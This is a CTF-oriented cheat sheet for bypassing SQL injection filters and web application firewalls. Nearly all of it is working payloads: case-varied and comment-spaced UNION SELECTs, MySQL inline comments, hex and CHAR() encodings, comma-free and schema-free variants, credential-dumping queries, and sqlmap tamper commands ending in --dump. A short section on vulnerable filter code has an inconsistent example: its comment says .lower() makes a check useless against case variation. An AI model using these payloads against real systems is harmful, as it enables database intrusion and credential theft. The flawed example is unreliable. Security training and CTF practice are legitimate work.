# SQL Injection — Filter & WAF Bypass

---

## Quick Reference

| What's Blocked | Bypass Method | Example |
|----------------|--------------|---------|
| Spaces | Comments / newlines | `UNION/**/SELECT` / `UNION%0ASELECT` |
| `UNION`, `SELECT` | Case variation | `UnIoN SeLeCt` |
| `UNION`, `SELECT` | Inline MySQL comments | `/*!UNION*//*!SELECT*/` |
| Single quotes `'` | Hex encoding | `0x61646d696e` instead of `'admin'` |
| Single quotes `'` | `CHAR()` function | `CHAR(97,100,109,105,110)` |
| `--` `#` `/* */` | Natural close / null byte | `' AND '1'='1` / `';%00` |
| `AND` / `OR` | Symbols | `&&` / `\|\|` |
| `=` | `LIKE` / `IN` / `REGEXP` | `username LIKE 'admin'` |
| `,` | `FROM … FOR` syntax | `SUBSTRING(s FROM 1 FOR 1)` |
| `information_schema` | Alternate schemas | `pg_tables` / `sqlite_master` |
| `SLEEP()` | Heavy query / GET_LOCK | `GET_LOCK('x',5)` |

```sql
-- Bypass cheatsheet: try in order
UnIoN SeLeCt                    -- 1. case variation
UNION/**/SELECT                  -- 2. comment as space
/*!UNION*//*!SELECT*/            -- 3. MySQL inline comments
UNION%0ASELECT                   -- 4. URL-encoded newline
UNION%09SELECT                   -- 5. tab as space
' && 1=1--                       -- 6. && instead of AND
username LIKE 0x61646d696e--     -- 7. hex instead of quotes
SUBSTRING(s FROM 1 FOR 1)        -- 8. comma-free substring
```

---

## What is Filter & WAF Bypass? 🔓

WAFs and input filters try to detect SQL injection by matching known keywords, symbols, or patterns. Bypass means expressing the **exact same SQL logic** using syntax the filter doesn't recognize — changing the form without changing the meaning.

**Impact:**
- 🔴 Turns a "blocked" injection into a working one
- 🔴 Unlocks UNION, blind, and error-based attacks on protected targets
- 🔴 Most CTF SQLi challenges have at least one filter layer
- ⚠️ Requires understanding *what* is blocked before picking a bypass

**The core idea:**

```sql
-- Blocked by WAF:
' UNION SELECT username,password FROM users--

-- Bypassed — same logic, different syntax:
' /*!UNION*/ /*!SELECT*/ username,password FROM users--
```

---

## Detecting What's Blocked

Before guessing bypass methods, probe the filter systematically — one component at a time.

**Step 1 — Isolate each keyword:**

```sql
' UNION--        -- is UNION blocked?
' SELECT--       -- is SELECT blocked?
' OR 1=1--       -- is OR blocked?
' AND 1=1--      -- is AND blocked?
'/**/--          -- are comments blocked?
' SLEEP(1)--     -- is SLEEP blocked?
```

**Step 2 — Check encoding handling:**

```sql
%27             -- URL-decoded ' — does the app decode before filtering?
%2527           -- double-encoded ' — does the WAF decode only once?
```

**Step 3 — Read error messages carefully:**
- `"blocked by WAF"` → external WAF, try encoding
- `"syntax error"` → filter stripped keywords, payload reached DB broken
- No response / 403 → WAF blocking at network level
- Normal page → filter passed, injection may be working

---

## Keyword & Space Bypasses

The most common filters target SQL keywords and whitespace between them.

**Space alternatives — all equivalent to a single space:**

```sql
UNION/**/SELECT                  -- inline comment
UNION/*anything*/SELECT          -- comment with content
UNION%09SELECT                   -- horizontal tab
UNION%0ASELECT                   -- newline (LF)
UNION%0DSELECT                   -- carriage return (CR)
UNION%0D%0ASELECT                -- CRLF
UNION+SELECT                     -- plus (URL context only)
(UNION)(SELECT)                  -- parentheses wrapping
```

**Keyword case variation — SQL is case-insensitive:**

```sql
UnIoN SeLeCt
uNiOn sElEcT
UNION select
union SELECT
```

**MySQL inline version comments — executed by MySQL, ignored by many WAFs:**

```sql
/*!UNION*//*!SELECT*/
/*!50000UNION*//*!50000SELECT*/     -- version-gated: runs on MySQL >= 5.0.0
/*!32302UNION*//*!32302SELECT*/     -- runs on MySQL >= 3.23.02
```

⚠️ Version-gated comments (`/*!VVVVVV*/`) only execute on MySQL/MariaDB. Use them when the target is confirmed MySQL.

**Combine multiple bypasses:**

```sql
/*!50000UnIoN*//**//*!50000SeLeCt*/
UnIoN/*comment*/SeLeCt/**/1,2,3--
```

---

## Quote & String Bypasses

When single quotes `'` are stripped or escaped, encode the string value instead.

**Hex encoding (MySQL, MariaDB, SQLite):**

```sql
-- Instead of: WHERE username='admin'
WHERE username=0x61646d696e

-- Instead of: UNION SELECT 'flag'
UNION SELECT 0x666c6167

-- Quick hex encoder:
-- 'admin' -> 0x61646d696e
-- 'users' -> 0x7573657273
-- 'flag'  -> 0x666c6167
```

**CHAR() function — works on all engines:**

```sql
-- Instead of: 'admin'
CHAR(97,100,109,105,110)

-- Instead of: 'a'
CHAR(97)

-- Full example:
' UNION SELECT NULL,CHAR(97,100,109,105,110),NULL--
```

**String without quotes using numeric context:**

```sql
-- If the parameter is numeric, no quotes needed
?id=1 UNION SELECT 1,2,3--
?id=1 OR 1=1--
```

**PostgreSQL / Oracle dollar-quoting:**

```sql
-- PostgreSQL: $$string$$ is equivalent to 'string'
WHERE username=$$admin$$
```

---

## Comment & Termination Bypasses

When `--`, `#`, and `/* */` are all blocked, close the query naturally instead.

**Natural string close — no comment needed:**

```sql
-- Original query: WHERE id='INPUT' AND active=1
-- Inject:
' AND '1'='1     -- closes cleanly: WHERE id='' AND '1'='1' AND active=1

-- Login bypass without any comment:
' OR 'a'='a      -- WHERE user='' OR 'a'='a' AND pass=''
```

**Null byte termination:**

```sql
';%00
'%00
' UNION SELECT NULL,NULL%00
```

**Newline as terminator (some parsers):**

```sql
'%0A
'%0D%0A
```

---

## Operator & Logic Bypasses

When `AND`, `OR`, and `=` are blocked, substitute equivalent operators.

**AND / OR alternatives:**

```sql
AND  →  &&   →  %26%26
OR   →  ||   →  %7C%7C

-- Examples:
' && 1=1--
' || 1=1--
' %26%26 1=1--
```

**Equals sign alternatives:**

```sql
=  →  LIKE          -- WHERE username LIKE 'admin'
=  →  IN(...)       -- WHERE username IN ('admin')
=  →  REGEXP        -- WHERE username REGEXP '^admin$'  (MySQL)
=  →  BETWEEN       -- WHERE id BETWEEN 1 AND 1
=  →  NOT <>        -- WHERE NOT username <> 'admin'
```

**NOT IN / subquery tricks:**

```sql
-- Instead of: WHERE id=1
WHERE id NOT IN (2,3,4,5)

-- Instead of: AND username='admin'
AND username NOT IN ('guest','user','test')
```

---

## Comma Bypass

Some WAFs block commas to prevent UNION column lists. Express the same thing without them.

**UNION without commas — use JOIN:**

```sql
-- Blocked:
' UNION SELECT 1,2,3--

-- Bypass with JOIN:
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```

**Substring without commas:**

```sql
-- Blocked: SUBSTRING(str,1,1)
SUBSTRING(str FROM 1 FOR 1)     -- MySQL / PostgreSQL
MID(str FROM 1 FOR 1)           -- MySQL
SUBSTR(str FROM 1 FOR 1)        -- PostgreSQL / SQLite
```

**LIMIT without commas:**

```sql
-- Blocked: LIMIT 0,1
LIMIT 1 OFFSET 0                -- MySQL / PostgreSQL / SQLite
```

---

## information_schema Bypass

When `information_schema` is blocked, use database-native alternatives.

**MySQL / MariaDB alternatives:**

```sql
-- sys schema (MySQL 5.7+)
SELECT table_name FROM sys.x$schema_table_statistics

-- InnoDB stats table
SELECT database_name,table_name FROM mysql.innodb_table_stats

-- Hex-encode the schema name
SELECT table_name FROM 0x696e666f726d6174696f6e5f736368656d61.tables
```

**PostgreSQL alternatives:**

```sql
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT relname FROM pg_class WHERE relkind='r'
SELECT column_name FROM pg_attribute pa JOIN pg_class pc ON pa.attrelid=pc.oid WHERE pc.relname='users'
```

**SQLite (no information_schema at all):**

```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'   -- returns CREATE TABLE
```

**Oracle alternatives:**

```sql
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT table_name FROM user_tables    -- current user's tables only
```

---

## Encoding & Obfuscation Reference

**URL encoding — one layer:**

| Char | Encoded |
|------|---------|
| `'` | `%27` |
| `"` | `%22` |
| ` ` | `%20` or `+` |
| `#` | `%23` |
| `=` | `%3d` |
| `(` | `%28` |
| `)` | `%29` |
| `,` | `%2c` |
| `\|` | `%7c` |
| `&` | `%26` |

**Double URL encoding — bypasses WAFs that decode only once:**

```
'   → %27  → %2527
/   → %2f  → %252f
```

**Hex string values (MySQL):**

```
'admin' → 0x61646d696e
'users' → 0x7573657273
'flag'  → 0x666c6167
'1'     → 0x31
```

**Scientific notation for numeric bypass:**

```sql
-- Instead of: id=1
id=1e0
id=1.0
id=0.1e1
```

---

## sqlmap Tamper Scripts

sqlmap has built-in tampers for every common filter. Combine them as needed.

```bash
# List all available tampers
sqlmap --list-tampers

# Most useful for CTFs:
sqlmap -u "URL?id=1" --tamper=space2comment         -- spaces → /**/
sqlmap -u "URL?id=1" --tamper=between                -- = → BETWEEN
sqlmap -u "URL?id=1" --tamper=charencode             -- URL-encode chars
sqlmap -u "URL?id=1" --tamper=equaltolike            -- = → LIKE
sqlmap -u "URL?id=1" --tamper=randomcase             -- RaNdOm CaSe
sqlmap -u "URL?id=1" --tamper=hex2char               -- strings → CHAR()
sqlmap -u "URL?id=1" --tamper=space2plus             -- spaces → +
sqlmap -u "URL?id=1" --tamper=percentage             -- injects % between chars

# Combine multiple tampers (applied left to right)
sqlmap -u "URL?id=1" --tamper=space2comment,between,charencode,randomcase

# Full WAF bypass attempt
sqlmap -u "URL?id=1" --tamper=space2comment,between,equaltolike,randomcase --random-agent --level=5 --risk=3 --batch --dump
```

---

## Exploitation Workflow

1. **Confirm injection exists** — `'` causes error or behavior change before worrying about WAF
2. **Identify the filter type** — WAF (403/blocked page) vs app-level filter (broken syntax reaching DB)
3. **Probe blocked components** — test `UNION`, `SELECT`, `OR`, `AND`, spaces, quotes individually
4. **Start with simplest bypass** — case variation → comment spacing → inline comments → encoding
5. **Bypass quotes if needed** — switch strings to hex `0x…` or `CHAR()`
6. **Bypass operators if needed** — replace `AND`/`OR` with `&&`/`||`, `=` with `LIKE`
7. **Bypass commas if needed** — use `JOIN` for UNION columns, `FROM … FOR` for SUBSTRING
8. **Bypass information_schema if needed** — use native schema tables for the identified DB
9. **Combine techniques** — layer case variation + comment spacing + encoding together
10. **Automate with sqlmap tampers** — once you know what's blocked, pick matching tamper scripts

---

## Common Vulnerable Patterns

**Blacklist filter — easily bypassed by case:**

```python
# ❌ Vulnerable filter — blocks lowercase keywords only
blocked = ['union', 'select', 'or', 'and']
for word in blocked:
    if word in user_input.lower():  # ← .lower() makes this useless
        return "blocked"
# Bypass: UnIoN SeLeCt still passes if check uses user_input directly
```

**Strip-once filter — double encoding survives:**

```php
// ❌ Vulnerable — strips SQL words once, doesn't re-check
$input = str_replace(['UNION','SELECT'], '', strtoupper($input));
// Bypass: UNUNIONION SELSELECTECT → after strip → UNION SELECT
```

**Space-only filter — comment spacing bypasses it:**

```python
# ❌ Vulnerable — only blocks literal spaces
if ' ' in user_input:
    return "blocked"
# Bypass: UNION/**/SELECT — no spaces, still valid SQL
```

**WAF checking GET only — POST body unfiltered:**

```http
# ❌ Misconfigured WAF — only inspects query string
GET /search?q=safe HTTP/1.1

# Bypass: move injection to POST body
POST /search HTTP/1.1
q=' UNION SELECT username,password FROM users--
```

---

## CTF & Practical Tips

**Systematic test order — try in sequence:**

```sql
' UNION SELECT 1,2,3--             -- baseline: is anything blocked?
' UnIoN SeLeCt 1,2,3--            -- case bypass
' UNION/**/SELECT/**/1,2,3--      -- comment spacing
'/*!UNION*//*!SELECT*/1,2,3--     -- MySQL inline comments
' UNION%0ASELECT%0A1,2,3--        -- newline spacing
' %55NION %53ELECT 1,2,3--        -- partial URL encoding
```

**Speed tips:**
- ✅ Always identify *what* is blocked before picking a bypass — don't spray randomly
- ✅ Check if the filter strips keywords once — try `UNUNIONION` and `SELSELECTECT`
- ✅ MySQL inline comments `/*!*/` are the most powerful single bypass — try them early
- ✅ Hex-encode all string values when quotes are blocked — `0x…` never needs quotes
- ✅ sqlmap `--tamper=space2comment,randomcase` covers 80% of CTF WAFs
- ⚠️ A 403 means the WAF blocked the request; a syntax error means it reached the DB broken — treat them differently

**Common CTF filter scenarios:**

- **Spaces blocked** → `UNION/**/SELECT` or `%0A`
- **UNION/SELECT blocked (case-sensitive)** → `UnIoN SeLeCt`
- **UNION/SELECT blocked (any case)** → `/*!UNION*/` or `UNUNIONION` (strip-once)
- **Quotes blocked** → hex `0x61646d696e` or `CHAR(97,100,109,105,110)`
- **AND/OR blocked** → `&&` / `||`
- **Commas blocked** → `JOIN` trick + `SUBSTRING(s FROM 1 FOR 1)`
- **information_schema blocked** → `pg_tables` / `sqlite_master` / `all_tables`

---

## Key Takeaways

- ✅ Identify *what* is blocked before picking a bypass — probe each component separately
- ✅ Case variation and comment spacing are the fastest first attempts
- ✅ MySQL `/*!UNION*/` inline comments bypass most pattern-matching WAFs in one shot
- ✅ Hex encoding (`0x…`) eliminates the need for quotes entirely — essential when `'` is filtered
- ✅ Strip-once filters fold under `UNUNIONION` / `SELSELECTECT` — always worth trying
- ✅ sqlmap tamper scripts automate all of this — use `space2comment,randomcase,between` as a starting stack